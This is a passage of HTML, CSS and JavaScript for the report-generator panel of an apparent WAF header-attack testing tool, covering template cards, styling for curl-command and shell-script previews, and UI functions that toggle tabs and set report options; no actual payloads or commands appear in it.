                        </div>
                        <div class="waf-template-info">
                            <h4>Technical Deep Dive</h4>
                            <p>Comprehensive analysis with all technical details</p>
                        </div>
                        <div class="waf-template-select">
                            <i class="fas fa-check-circle"></i>
                        </div>
                    </div>
                    
                    <div class="waf-report-template-card" onclick="selectWafTemplate('compliance')">
                        <div class="waf-template-thumbnail compliance">
                            <i class="fas fa-clipboard-check"></i>
                        </div>
                        <div class="waf-template-info">
                            <h4>Compliance Report</h4>
                            <p>Security assessment with compliance focus</p>
                        </div>
                        <div class="waf-template-select">
                            <i class="fas fa-check-circle"></i>
                        </div>
                    </div>
                    
                    <div class="waf-report-template-card" onclick="selectWafTemplate('penetration')">
                        <div class="waf-template-thumbnail penetration">
                            <i class="fas fa-terminal"></i>
                        </div>
                        <div class="waf-template-info">
                            <h4>Penetration Test</h4>
                            <p>Detailed attack vectors with executable commands</p>
                        </div>
                        <div class="waf-template-select">
                            <i class="fas fa-check-circle"></i>
                        </div>
                    </div>
                </div>
            </div>
            
            <!-- History Tab Content -->
            <div id="waf-history" class="waf-report-tab-content">
                <div class="waf-report-history-empty">
                    <i class="fas fa-history"></i>
                    <p>Your report history will appear here</p>
                </div>
                <div class="waf-report-history-list" style="display: none;">
                    <!-- Will be populated dynamically -->
                </div>
            </div>
            
            <!-- Footer with Action Buttons -->
            <div class="waf-report-panel-actions">
                <button class="waf-report-action-button secondary" onclick="toggleReportPanel()">
                    <i class="fas fa-times"></i> Cancel
                </button>
                <button class="waf-report-action-button primary" onclick="generateAdvancedWafReport()">
                    <i class="fas fa-file-excel"></i> Generate Report
                </button>
            </div>
        </div>
    </div>
    
    <!-- Report Generation Progress Overlay -->
    <div id="wafReportProgress" class="waf-report-progress-overlay">
        <div class="waf-report-progress-dialog">
            <div class="waf-report-progress-icon">
                <i class="fas fa-cog fa-spin"></i>
            </div>
            <h3>Generating Report</h3>
            <div class="waf-report-progress-bar-container">
                <div id="wafReportProgressBar" class="waf-report-progress-bar"></div>
            </div>
            <div id="wafReportProgressStatus" class="waf-report-progress-status">Analyzing test data...</div>
        </div>
    </div>
</div>

<!-- Styles for the Report Generator -->
<style>
/* Main Container Styles */
.waf-report-generator-container {
    font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
    --primary-color: #0066cc;
    --primary-dark: #004c99;
    --primary-light: #cce0ff;
    --secondary-color: #2d3748;
    --success-color: #48bb78;
    --warning-color: #ed8936;
    --danger-color: #e53e3e;
    --text-color: #2d3748;
    --text-light: #718096;
    --border-color: #e2e8f0;
    --background-light: #f7fafc;
    --box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
    --transition-speed: 0.3s;
}

/* Floating Action Button Styles */
.waf-report-fab {
    position: fixed;
    left: 24px;
    top: 50%;
    transform: translateY(-50%);
    z-index: 999;
    display: flex;
    align-items: center;
    transition: all var(--transition-speed) ease;
}

.waf-report-fab-button {
    width: 60px;
    height: 60px;
    border-radius: 50%;
    background: linear-gradient(135deg, var(--primary-color) 0%, var(--primary-dark) 100%);
    border: none;
    color: white;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 24px;
    cursor: pointer;
    box-shadow: var(--box-shadow);
    transition: all var(--transition-speed) ease;
    position: relative;
    overflow: hidden;
}

.waf-report-fab-button:after {
    content: '';
    position: absolute;
    width: 100%;
    height: 100%;
    background: rgba(255, 255, 255, 0.1);
    top: 0;
    left: 0;
    border-radius: 50%;
    transform: scale(0);
    transition: all 0.3s ease;
}

.waf-report-fab-button:hover:after {
    transform: scale(1);
}

.waf-report-fab-button:hover {
    transform: scale(1.05);
    box-shadow: 0 6px 10px rgba(0, 0, 0, 0.2);
}

.waf-report-fab-button:active {
    transform: scale(0.95);
}

.waf-report-fab-label {
    background: var(--secondary-color);
    color: white;
    padding: 8px 16px;
    border-radius: 4px;
    margin-left: 16px;
    font-size: 14px;
    font-weight: 500;
    opacity: 0;
    transform: translateX(-10px);
    transition: all var(--transition-speed) ease;
    white-space: nowrap;
    box-shadow: var(--box-shadow);
    pointer-events: none;
}

.waf-report-fab:hover .waf-report-fab-label {
    opacity: 1;
    transform: translateX(0);
}

/* Pulse Animation */
.pulse-animation {
    animation: pulse 2s infinite;
}

@keyframes pulse {
    0% {
        box-shadow: 0 0 0 0 rgba(0, 102, 204, 0.4);
    }
    70% {
        box-shadow: 0 0 0 10px rgba(0, 102, 204, 0);
    }
    100% {
        box-shadow: 0 0 0 0 rgba(0, 102, 204, 0);
    }
}

/* Report Panel Styles */
.waf-report-panel {
    position: fixed;
    left: -520px;
    top: 0;
    width: 520px;
    height: 100vh;
    background: white;
    box-shadow: 0 0 20px rgba(0, 0, 0, 0.15);
    z-index: 1000;
    transition: all var(--transition-speed) ease;
    display: flex;
    flex-direction: column;
    overflow: hidden;
}

.waf-report-panel.active {
    left: 0;
}

.waf-report-panel-header {
    padding: 20px;
    background: var(--primary-color);
    color: white;
    display: flex;
    justify-content: space-between;
    align-items: center;
}

.waf-report-panel-header h2 {
    margin: 0;
    font-size: 20px;
    font-weight: 600;
    display: flex;
    align-items: center;
    gap: 10px;
}

.waf-report-panel-close {
    background: transparent;
    border: none;
    color: white;
    font-size: 20px;
    cursor: pointer;
    width: 32px;
    height: 32px;
    display: flex;
    align-items: center;
    justify-content: center;
    border-radius: 4px;
    transition: all 0.2s ease;
}

.waf-report-panel-close:hover {
    background: rgba(255, 255, 255, 0.1);
}

.waf-report-panel-content {
    flex: 1;
    overflow-y: auto;
    display: flex;
    flex-direction: column;
}

/* Tab Navigation */
.waf-report-tabs {
    display: flex;
    border-bottom: 1px solid var(--border-color);
    background: var(--background-light);
}

.waf-report-tab {
    padding: 15px 20px;
    background: transparent;
    border: none;
    border-bottom: 3px solid transparent;
    color: var(--text-light);
    font-weight: 500;
    cursor: pointer;
    transition: all 0.2s ease;
    flex: 1;
    text-align: center;
}

.waf-report-tab.active {
    border-bottom: 3px solid var(--primary-color);
    color: var(--primary-color);
}

.waf-report-tab:hover:not(.active) {
    background: rgba(0, 0, 0, 0.03);
    color: var(--text-color);
}

.waf-report-tab-content {
    display: none;
    padding: 20px;
    flex: 1;
    overflow-y: auto;
}

.waf-report-tab-content.active {
    display: block;
}

/* Report Options Styles */
.waf-report-options-section {
    margin-bottom: 25px;
    padding-bottom: 20px;
    border-bottom: 1px solid var(--border-color);
}

.waf-report-options-section:last-child {
    border-bottom: none;
    padding-bottom: 0;
}

.waf-report-options-section h3 {
    margin: 0 0 15px 0;
    font-size: 16px;
    font-weight: 600;
    color: var(--text-color);
}

.waf-report-option-group {
    margin-bottom: 15px;
}

.waf-report-option-group:last-child {
    margin-bottom: 0;
}

.waf-report-option-group label {
    display: block;
    margin-bottom: 6px;
    font-size: 14px;
    color: var(--text-color);
}

.waf-report-option-group input[type="text"],
.waf-select {
    width: 100%;
    padding: 10px 12px;
    border: 1px solid var(--border-color);
    border-radius: 4px;
    font-size: 14px;
    transition: all 0.2s ease;
}

.waf-report-option-group input[type="text"]:focus,
.waf-select:focus {
    border-color: var(--primary-color);
    box-shadow: 0 0 0 2px var(--primary-light);
    outline: none;
}

.waf-report-checkbox-group {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 12px;
}

.waf-report-checkbox {
    display: flex;
    align-items: center;
    cursor: pointer;
}

.waf-report-checkbox input {
    margin-right: 8px;
}

.waf-report-radio-group {
    display: flex;
    gap: 15px;
}

.waf-report-radio {
    display: flex;
    align-items: center;
    cursor: pointer;
}

.waf-report-radio input {
    margin-right: 8px;
}

/* Additional Headers Styles */
.waf-additional-headers {
    display: flex;
    flex-direction: column;
    gap: 10px;
    margin-bottom: 10px;
}

.waf-header-row {
    display: flex;
    gap: 10px;
}

.waf-header-name,
.waf-header-value {
    flex: 1;
    padding: 8px 12px;
    border: 1px solid var(--border-color);
    border-radius: 4px;
    font-size: 14px;
}

.waf-header-remove {
    background: var(--background-light);
    border: 1px solid var(--border-color);
    border-radius: 4px;
    width: 32px;
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    color: var(--text-light);
    transition: all 0.2s ease;
}

.waf-header-remove:hover {
    background: #f1f1f1;
    color: var(--danger-color);
}

.waf-add-header {
    background: var(--background-light);
    border: 1px solid var(--border-color);
    border-radius: 4px;
    padding: 8px 12px;
    font-size: 14px;
    cursor: pointer;
    display: flex;
    align-items: center;
    gap: 8px;
    transition: all 0.2s ease;
}

.waf-add-header:hover {
    background: #f1f1f1;
}

/* Color Theme Options */
.waf-report-color-options {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 12px;
}

.waf-report-color-option {
    display: flex;
    align-items: center;
    cursor: pointer;
    padding: 8px;
    border-radius: 4px;
    transition: all 0.2s ease;
}

.waf-report-color-option:hover {
    background: var(--background-light);
}

.color-preview {
    width: 24px;
    height: 24px;
    border-radius: 4px;
    margin-right: 10px;
}

.color-preview.professional {
    background: linear-gradient(135deg, #0066cc 0%, #004c99 100%);
}

.color-preview.corporate {
    background: linear-gradient(135deg, #2c5282 0%, #1a365d 100%);
}

.color-preview.technical {
    background: linear-gradient(135deg, #3182ce 0%, #2b6cb0 100%);
}

.color-preview.security {
    background: linear-gradient(135deg, #e53e3e 0%, #c53030 100%);
}

.color-preview.penetration {
    background: linear-gradient(135deg, #282828 0%, #1a1a1a 100%);
}

/* File Upload */
#wafLogoUpload {
    border: 1px dashed var(--border-color);
    padding: 12px;
    width: 100%;
    border-radius: 4px;
    background: var(--background-light);
    font-size: 14px;
}

/* Preview Tab Styles */
.waf-report-preview-container {
    height: 100%;
    display: flex;
    flex-direction: column;
    border: 1px solid var(--border-color);
    border-radius: 6px;
    overflow: hidden;
}

.waf-report-preview-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 12px 16px;
    background: var(--background-light);
    border-bottom: 1px solid var(--border-color);
}

#wafPreviewSheet {
    padding: 8px 12px;
    border-radius: 4px;
    border: 1px solid var(--border-color);
    font-size: 14px;
}

.waf-report-preview-controls {
    display: flex;
    gap: 10px;
}

.waf-preview-control {
    padding: 8px 12px;
    background: white;
    border: 1px solid var(--border-color);
    border-radius: 4px;
    font-size: 14px;
    cursor: pointer;
    transition: all 0.2s ease;
    display: flex;
    align-items: center;
    gap: 6px;
}

.waf-preview-control:hover {
    background: var(--background-light);
}

.waf-report-preview-content {
    flex: 1;
    overflow: auto;
    padding: 20px;
    background: white;
}

.waf-preview-placeholder {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    height: 300px;
    color: var(--text-light);
}

.waf-preview-placeholder i {
    font-size: 48px;
    margin-bottom: 16px;
    opacity: 0.5;
}

.waf-preview-placeholder p {
    font-size: 16px;
}

/* Templates Tab Styles */
.waf-report-templates-grid {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 16px;
}

.waf-report-template-card {
    border: 1px solid var(--border-color);
    border-radius: 6px;
    overflow: hidden;
    transition: all 0.2s ease;
    cursor: pointer;
    position: relative;
    background: white;
}

.waf-report-template-card:hover {
    transform: translateY(-2px);
    box-shadow: var(--box-shadow);
}

.waf-report-template-card.selected {
    border-color: var(--primary-color);
    box-shadow: 0 0 0 2px var(--primary-light);
}

.waf-template-thumbnail {
    height: 100px;
    display: flex;
    align-items: center;
    justify-content: center;
    color: white;
    font-size: 36px;
}

.waf-template-thumbnail.executive {
    background: linear-gradient(135deg, #4c51bf 0%, #434190 100%);
}

.waf-template-thumbnail.technical {
    background: linear-gradient(135deg, #2b6cb0 0%, #2c5282 100%);
}

.waf-template-thumbnail.compliance {
    background: linear-gradient(135deg, #38a169 0%, #2f855a 100%);
}

.waf-template-thumbnail.penetration {
    background: linear-gradient(135deg, #1a202c 0%, #2d3748 100%);
}

.waf-template-info {
    padding: 12px;
}

.waf-template-info h4 {
    margin: 0 0 4px 0;
    font-size: 16px;
    font-weight: 600;
}

.waf-template-info p {
    margin: 0;
    font-size: 14px;
    color: var(--text-light);
}

.waf-template-select {
    position: absolute;
    top: 10px;
    right: 10px;
    width: 24px;
    height: 24px;
    border-radius: 50%;
    background: white;
    display: flex;
    align-items: center;
    justify-content: center;
    color: var(--primary-color);
    opacity: 0;
    transition: all 0.2s ease;
}

.waf-report-template-card.selected .waf-template-select {
    opacity: 1;
}

/* History Tab Styles */
.waf-report-history-empty {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    height: 300px;
    color: var(--text-light);
}

.waf-report-history-empty i {
    font-size: 48px;
    margin-bottom: 16px;
    opacity: 0.5;
}

.waf-report-history-empty p {
    font-size: 16px;
}

.waf-report-history-list {
    display: flex;
    flex-direction: column;
    gap: 12px;
}

.waf-history-item {
    display: flex;
    align-items: center;
    gap: 12px;
    padding: 12px;
    background: white;
    border: 1px solid var(--border-color);
    border-radius: 6px;
    transition: all 0.2s ease;
}

.waf-history-item:hover {
    box-shadow: var(--box-shadow);
}

.waf-history-icon {
    width: 40px;
    height: 40px;
    border-radius: 8px;
    background: var(--primary-light);
    color: var(--primary-color);
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 18px;
}

.waf-history-details {
    flex: 1;
}

.waf-history-details h4 {
    margin: 0 0 4px 0;
    font-size: 16px;
    font-weight: 500;
}

.waf-history-details p {
    margin: 0;
    font-size: 14px;
    color: var(--text-light);
}

.waf-history-actions {
    display: flex;
    gap: 8px;
}

.waf-history-actions button {
    width: 32px;
    height: 32px;
    border-radius: 4px;
    border: 1px solid var(--border-color);
    background: white;
    color: var(--text-light);
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    transition: all 0.2s ease;
}

.waf-history-actions button:hover {
    background: var(--background-light);
    color: var(--primary-color);
}

/* Action Buttons */
.waf-report-panel-actions {
    padding: 16px 20px;
    border-top: 1px solid var(--border-color);
    display: flex;
    justify-content: flex-end;
    gap: 12px;
}

.waf-report-action-button {
    padding: 10px 16px;
    border-radius: 4px;
    font-size: 14px;
    font-weight: 500;
    cursor: pointer;
    display: flex;
    align-items: center;
    gap: 8px;
    transition: all 0.2s ease;
}

.waf-report-action-button.primary {
    background: var(--primary-color);
    color: white;
    border: none;
}

.waf-report-action-button.primary:hover {
    background: var(--primary-dark);
}

.waf-report-action-button.secondary {
    background: white;
    color: var(--text-color);
    border: 1px solid var(--border-color);
}

.waf-report-action-button.secondary:hover {
    background: var(--background-light);
}

/* Progress Overlay */
.waf-report-progress-overlay {
    position: fixed;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background: rgba(0, 0, 0, 0.5);
    display: flex;
    align-items: center;
    justify-content: center;
    z-index: 1010;
    opacity: 0;
    pointer-events: none;
    transition: opacity 0.3s ease;
}

.waf-report-progress-overlay.active {
    opacity: 1;
    pointer-events: auto;
}

.waf-report-progress-dialog {
    background: white;
    border-radius: 8px;
    padding: 24px;
    width: 400px;
    max-width: 90%;
    box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
    text-align: center;
}

.waf-report-progress-icon {
    font-size: 48px;
    color: var(--primary-color);
    margin-bottom: 16px;
}

.waf-report-progress-dialog h3 {
    margin: 0 0 20px 0;
    font-size: 20px;
    font-weight: 600;
}

.waf-report-progress-bar-container {
    height: 8px;
    background: var(--background-light);
    border-radius: 4px;
    margin-bottom: 12px;
    overflow: hidden;
}

.waf-report-progress-bar {
    height: 100%;
    background: var(--primary-color);
    width: 0%;
    transition: width 0.3s ease;
}

.waf-report-progress-status {
    font-size: 14px;
    color: var(--text-light);
}

/* Report Success Message */
.waf-report-success-message {
    position: fixed;
    top: 20px;
    right: 20px;
    z-index: 1010;
    animation: slideIn 0.3s ease forwards;
}

.waf-report-success-content {
    background: var(--success-color);
    color: white;
    padding: 15px 20px;
    border-radius: 4px;
    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
    display: flex;
    align-items: center;
    gap: 10px;
    font-size: 16px;
}

.waf-report-success-content i {
    font-size: 20px;
}

.waf-report-success-content button {
    background: none;
    border: none;
    color: white;
    font-size: 20px;
    cursor: pointer;
    margin-left: 10px;
    padding: 0;
    line-height: 1;
}

@keyframes slideIn {
    from {
        transform: translateX(100%);
        opacity: 0;
    }
    to {
        transform: translateX(0);
        opacity: 1;
    }
}

/* Preview Content Styles */
.waf-preview-executive-summary {
    font-family: Arial, sans-serif;
    color: #333;
}

.waf-preview-header {
    margin-bottom: 20px;
    padding-bottom: 20px;
    border-bottom: 1px solid #eee;
}

.waf-preview-header h2 {
    margin: 0 0 10px 0;
    color: #2d3748;
}

.waf-preview-header h3 {
    margin: 0 0 10px 0;
    color: #4a5568;
    font-weight: 500;
}

.waf-preview-date {
    color: #718096;
    font-size: 14px;
    margin: 0;
}

.waf-preview-summary-card {
    background: #fff;
    border: 1px solid #e2e8f0;
    border-radius: 8px;
    padding: 20px;
    margin-bottom: 20px;
    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.05);
}

.waf-preview-summary-card h3 {
    margin: 0 0 15px 0;
    color: #2d3748;
    font-size: 18px;
    border-bottom: 1px solid #eee;
    padding-bottom: 10px;
}

.waf-preview-summary-stats {
    display: flex;
    justify-content: space-between;
    margin-top: 20px;
    flex-wrap: wrap;
}

.waf-summary-stat {
    text-align: center;
    padding: 15px;
    flex: 1;
    min-width: 100px;
    border-radius: 6px;
    background: #f7fafc;
}

.waf-summary-stat.critical {
    background: #fff5f5;
    color: #e53e3e;
}

.waf-summary-stat.high {
    background: #fffaf0;
    color: #dd6b20;
}

.waf-summary-stat.medium {
    background: #fffbeb;
    color: #d97706;
}

.waf-summary-stat.low {
    background: #f0fff4;
    color: #38a169;
}

.waf-stat-value {
    font-size: 28px;
    font-weight: bold;
    margin-bottom: 5px;
}

.waf-stat-label {
    font-size: 14px;
    color: inherit;
}

.waf-key-findings {
    display: flex;
    flex-direction: column;
    gap: 15px;
}

.waf-finding {
    display: flex;
    gap: 15px;
}

.waf-finding-icon {
    width: 40px;
    height: 40px;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    flex-shrink: 0;
    font-size: 18px;
}

.waf-finding-icon.critical {
    background: #fff5f5;
    color: #e53e3e;
}

.waf-finding-icon.high {
    background: #fffaf0;
    color: #dd6b20;
}

.waf-finding-icon.medium {
    background: #fffbeb;
    color: #d97706;
}

.waf-finding-icon.success {
    background: #f0fff4;
    color: #38a169;
}

.waf-finding-content h4 {
    margin: 0 0 5px 0;
    font-size: 16px;
}

.waf-finding-content p {
    margin: 0;
    color: #718096;
}

.waf-preview-detailed-analysis {
    font-family: Arial, sans-serif;
    color: #333;
}

.waf-preview-detailed-analysis h3 {
    margin: 0 0 15px 0;
    color: #2d3748;
    font-size: 18px;
}

.waf-analysis-table-container {
    overflow-x: auto;
    border: 1px solid #e2e8f0;
    border-radius: 8px;
    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.05);
}

.waf-analysis-table {
    width: 100%;
    border-collapse: collapse;
}

.waf-analysis-table th {
    background: #f7fafc;
    padding: 12px 15px;
    text-align: left;
    font-weight: 600;
    color: #4a5568;
    border-bottom: 1px solid #e2e8f0;
    white-space: nowrap;
}

.waf-analysis-table td {
    padding: 10px 15px;
    border-bottom: 1px solid #e2e8f0;
    font-size: 14px;
}

.waf-analysis-table tr:last-child td {
    border-bottom: none;
}

.waf-analysis-table tr:hover {
    background: #f7fafc;
}

.waf-severity-badge {
    display: inline-block;
    padding: 4px 8px;
    border-radius: 4px;
    font-size: 12px;
    font-weight: 500;
}

.waf-severity-badge.critical {
    background: #fff5f5;
    color: #e53e3e;
}

.waf-severity-badge.high {
    background: #fffaf0;
    color: #dd6b20;
}

.waf-severity-badge.medium {
    background: #fffbeb;
    color: #d97706;
}

.waf-severity-badge.low {
    background: #f0fff4;
    color: #38a169;
}

tr.waf-severity-critical {
    background: #fff5f510;
}

tr.waf-severity-high {
    background: #fffaf010;
}

tr.waf-severity-medium {
    background: #fffbeb10;
}

tr.waf-severity-low {
    background: #f0fff410;
}

.waf-analysis-table code {
    font-family: monospace;
    background: #f8f9fa;
    padding: 2px 4px;
    border-radius: 4px;
    font-size: 12px;
    max-width: 250px;
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
    display: block;
}

.waf-analysis-table code.waf-curl-command {
    max-width: 300px;
    background: #2d3748;
    color: #e2e8f0;
    padding: 4px 8px;
}

.waf-more-rows td {
    text-align: center;
    padding: 15px;
    background: #f8f9fa;
}

.waf-more-info {
    color: #718096;
    font-style: italic;
}

.waf-preview-statistics {
    font-family: Arial, sans-serif;
    color: #333;
}

.waf-statistics-grid {
    display: grid;
    grid-template-columns: repeat(2, 1fr);
    gap: 20px;
}

.waf-statistics-card {
    background: #fff;
    border: 1px solid #e2e8f0;
    border-radius: 8px;
    padding: 20px;
    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.05);
}

.waf-statistics-card h3 {
    margin: 0 0 15px 0;
    color: #2d3748;
    font-size: 16px;
    border-bottom: 1px solid #eee;
    padding-bottom: 10px;
}

.waf-severity-distribution {
    display: flex;
    height: 24px;
    border-radius: 12px;
    overflow: hidden;
    margin-bottom: 15px;
}

.waf-severity-segment {
    height: 100%;
}

.waf-severity-segment.critical {
    background: #e53e3e;
}

.waf-severity-segment.high {
    background: #dd6b20;
}

.waf-severity-segment.medium {
    background: #d97706;
}

.waf-severity-segment.low {
    background: #38a169;
}

.waf-donut-legend {
    display: flex;
    flex-wrap: wrap;
    gap: 10px;
}

.waf-legend-item {
    display: flex;
    align-items: center;
    font-size: 14px;
}

.waf-legend-color {
    width: 16px;
    height: 16px;
    margin-right: 6px;
    border-radius: 4px;
}

.waf-legend-color.critical {
    background: #e53e3e;
}

.waf-legend-color.high {
    background: #dd6b20;
}

.waf-legend-color.medium {
    background: #d97706;
}

.waf-legend-color.low {
    background: #38a169;
}

.waf-category-chart {
    display: flex;
    flex-direction: column;
    gap: 12px;
}

.waf-category-bar {
    display: flex;
    align-items: center;
    gap: 10px;
}

.waf-category-name {
    width: 120px;
    font-size: 14px;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
}

.waf-category-bar-container {
    flex: 1;
    height: 12px;
    background: #f7fafc;
    border-radius: 6px;
    overflow: hidden;
}

.waf-category-bar-fill {
    height: 100%;
    background: linear-gradient(90deg, #3182ce 0%, #63b3ed 100%);
}

.waf-category-count {
    width: 30px;
    text-align: right;
    font-size: 14px;
    font-weight: 500;
}

.waf-metrics-grid {
    display: grid;
    grid-template-columns: repeat(2, 1fr);
    gap: 15px;
}

.waf-metric-item {
    padding: 15px;
    background: #f7fafc;
    border-radius: 8px;
    text-align: center;
}

.waf-metric-value {
    font-size: 24px;
    font-weight: 600;
    color: #2d3748;
    margin-bottom: 5px;
}

.waf-metric-label {
    font-size: 14px;
    color: #718096;
}

.waf-risk-meter-container {
    margin-bottom: 20px;
}

.waf-risk-meter {
    height: 20px;
    background: linear-gradient(90deg, #38a169 0%, #d97706 50%, #e53e3e 100%);
    border-radius: 10px;
    position: relative;
    margin-bottom: 6px;
}

.waf-risk-level {
    position: absolute;
    top: -10px;
    left: var(--risk-level);
    transform: translateX(-50%);
    width: 8px;
    height: 40px;
    background: #2d3748;
    border-radius: 4px;
}

.waf-risk-labels {
    display: flex;
    justify-content: space-between;
    font-size: 12px;
    color: #718096;
}

.waf-risk-summary {
    font-size: 14px;
    line-height: 1.5;
}

.waf-risk-summary p {
    margin: 0 0 10px 0;
}

.waf-preview-curl-commands {
    font-family: Arial, sans-serif;
    color: #333;
}

.waf-curl-list {
    display: flex;
    flex-direction: column;
    gap: 15px;
}

.waf-curl-item {
    background: white;
    border: 1px solid #e2e8f0;
    border-radius: 6px;
    overflow: hidden;
}

.waf-curl-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 12px 15px;
    background: #f7fafc;
    border-bottom: 1px solid #e2e8f0;
}

.waf-curl-title {
    font-weight: 500;
    color: #2d3748;
    display: flex;
    align-items: center;
    gap: 8px;
}

.waf-curl-badge {
    padding: 3px 8px;
    border-radius: 4px;
    font-size: 12px;
    background: #e2e8f0;
    color: #4a5568;
}

.waf-curl-content {
    padding: 15px;
}

.waf-curl-command {
    background: #2d3748;
    color: #e2e8f0;
    padding: 12px 15px;
    border-radius: 4px;
    font-family: monospace;
    font-size: 14px;
    overflow-x: auto;
    white-space: nowrap;
}

.waf-curl-action {
    display: flex;
    justify-content: flex-end;
    padding: 8px 15px;
    background: #f7fafc;
    border-top: 1px solid #e2e8f0;
}

.waf-curl-copy {
    padding: 6px 12px;
    background: white;
    border: 1px solid #e2e8f0;
    border-radius: 4px;
    font-size: 14px;
    cursor: pointer;
    display: flex;
    align-items: center;
    gap: 6px;
    transition: all 0.2s ease;
}

.waf-curl-copy:hover {
    background: #f1f1f1;
}

.waf-preview-shell-script {
    font-family: Arial, sans-serif;
    color: #333;
}

.waf-shell-container {
    background: #2d3748;
    color: #e2e8f0;
    padding: 20px;
    border-radius: 6px;
    font-family: monospace;
    overflow: hidden;
}

.waf-shell-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding-bottom: 15px;
    border-bottom: 1px solid #4a5568;
    margin-bottom: 15px;
}

.waf-shell-title {
    font-size: 16px;
    font-weight: 500;
    color: #e2e8f0;
}

.waf-shell-actions {
    display: flex;
    gap: 10px;
}

.waf-shell-action {
    padding: 6px 12px;
    background: #4a5568;
    border: none;
    border-radius: 4px;
    color: white;
    font-size: 14px;
    cursor: pointer;
    display: flex;
    align-items: center;
    gap: 6px;
    transition: all 0.2s ease;
}

.waf-shell-action:hover {
    background: #718096;
}

.waf-shell-content {
    max-height: 400px;
    overflow-y: auto;
    padding-right: 10px;
}

.waf-shell-line {
    margin: 0;
    padding: 4px 0;
    line-height: 1.5;
}

.waf-shell-comment {
    color: #a0aec0;
}

.waf-shell-command {
    color: #90cdf4;
}

.waf-shell-variable {
    color: #fbd38d;
}

.waf-shell-output {
    color: #9ae6b4;
}

/* Responsive Styles */
@media (max-width: 768px) {
    .waf-report-fab {
        left: 16px;
        bottom: 16px;
        top: auto;
        transform: none;
    }
    
    .waf-report-fab:hover {
        transform: none;
    }
    
    .waf-report-panel {
        width: 100%;
        left: -100%;
    }
    
    .waf-report-checkbox-group,
    .waf-report-color-options,
    .waf-report-templates-grid,
    .waf-statistics-grid {
        grid-template-columns: 1fr;
    }
    
    .waf-header-row {
        flex-direction: column;
    }
    
    .waf-header-remove {
        align-self: flex-end;
    }
}
</style>

<!-- JavaScript for the Report Generator -->
<script>
// Global state
let wafReportPanelOpen = false;
let wafSelectedTemplate = 'executive';
let wafReportHistory = [];
let wafCompanyLogo = null;

// Toggle the report panel
function toggleReportPanel() {
    const panel = document.getElementById('wafReportPanel');
    wafReportPanelOpen = !wafReportPanelOpen;
    
    if (wafReportPanelOpen) {
        panel.classList.add('active');
        document.getElementById('wafReportFabButton').classList.remove('pulse-animation');
    } else {
        panel.classList.remove('active');
    }
}

// Switch between tabs
function switchTab(tabButton, tabId) {
    // Update tab buttons
    document.querySelectorAll('.waf-report-tab').forEach(tab => {
        tab.classList.remove('active');
    });
    tabButton.classList.add('active');
    
    // Update tab content
    document.querySelectorAll('.waf-report-tab-content').forEach(content => {
        content.classList.remove('active');
    });
    document.getElementById(tabId).classList.add('active');
    
    // If switching to preview tab, generate a preview
    if (tabId === 'waf-preview') {
        refreshWafPreview();
    }
}

// Add a new header row
function addHeaderRow() {
    const headerContainer = document.getElementById('wafAdditionalHeaders');
    const newRow = document.createElement('div');
    newRow.className = 'waf-header-row';
    newRow.innerHTML = `
        <input type="text" placeholder="Header name" class="waf-header-name">
        <input type="text" placeholder="Header value" class="waf-header-value">
        <button class="waf-header-remove" onclick="removeHeaderRow(this)">
            <i class="fas fa-times"></i>
        </button>
    `;
    headerContainer.appendChild(newRow);
}

// Remove a header row
function removeHeaderRow(button) {
    const row = button.closest('.waf-header-row');
    row.remove();
}

// Select a report template
function selectWafTemplate(template) {
    wafSelectedTemplate = template;
    
    // Update UI
    document.querySelectorAll('.waf-report-template-card').forEach(card => {
        card.classList.remove('selected');
    });
    
    const selectedCard = document.querySelector(`.waf-report-template-card[onclick*="${template}"]`);
    if (selectedCard) {
        selectedCard.classList.add('selected');
    }
    
    // Update options based on template
    updateOptionsFromTemplate(template);
    
    // Switch to options tab
    const optionsTab = document.querySelector('.waf-report-tab[onclick*="waf-options"]');
    switchTab(optionsTab, 'waf-options');
}

// Update options based on selected template
function updateOptionsFromTemplate(template) {
    // Default options for all templates
    document.getElementById('wafIncludeExecutiveSummary').checked = true;
    document.getElementById('wafIncludeDetailedAnalysis').checked = true;
    document.getElementById('wafIncludeStatistics').checked = true;
    document.getElementById('wafIncludeCharts').checked = true;
    document.getElementById('wafIncludePayloads').checked = true;
    document.getElementById('wafIncludeCurlCommands').checked = true;
    document.getElementById('wafIncludeRecommendations').checked = true;
    document.getElementById('wafIncludeShellScript').checked = true;
    
    // Template specific settings
    switch(template) {
        case 'executive':
            document.getElementById('wafReportTitle').value = 'WAF Security Executive Summary';
            document.getElementById('wafIncludePayloads').checked = false;
            document.getElementById('wafIncludeCurlCommands').checked = false;
            document.getElementById('wafIncludeShellScript').checked = false;
            document.querySelector('input[name="wafColorTheme"][value="professional"]').checked = true;
            break;
            
        case 'technical':
            document.getElementById('wafReportTitle').value = 'WAF Header Attack Technical Analysis';
            document.querySelector('input[name="wafColorTheme"][value="technical"]').checked = true;
            break;
            
        case 'compliance':
            document.getElementById('wafReportTitle').value = 'WAF Security Compliance Report';
            document.getElementById('wafIncludeCurlCommands').checked = false;
            document.getElementById('wafIncludeShellScript').checked = false;
            document.querySelector('input[name="wafColorTheme"][value="corporate"]').checked = true;
            break;
            
        case 'penetration':
